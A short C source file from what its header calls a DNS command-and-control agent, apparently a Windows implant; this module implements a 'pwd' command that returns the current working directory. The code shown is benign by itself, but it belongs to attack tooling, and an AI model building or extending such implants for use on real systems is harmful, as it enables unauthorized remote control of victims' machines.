/**
 * pwd.c - Print working directory command for DNS C2 Agent
 */

 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include "../include/pwd.h"
 #include "../include/Utils.h"
 
 /**
  * Print the current working directory
  */
 char* cmd_pwd(const char* args) {
     (void)args; // Suppress unused parameter warning
     
     // Use Unicode-aware function
     char* dir = get_current_directory();
     if (dir == NULL) {
         return _strdup("Error: Could not get current directory");
     }
     return dir;
 }
 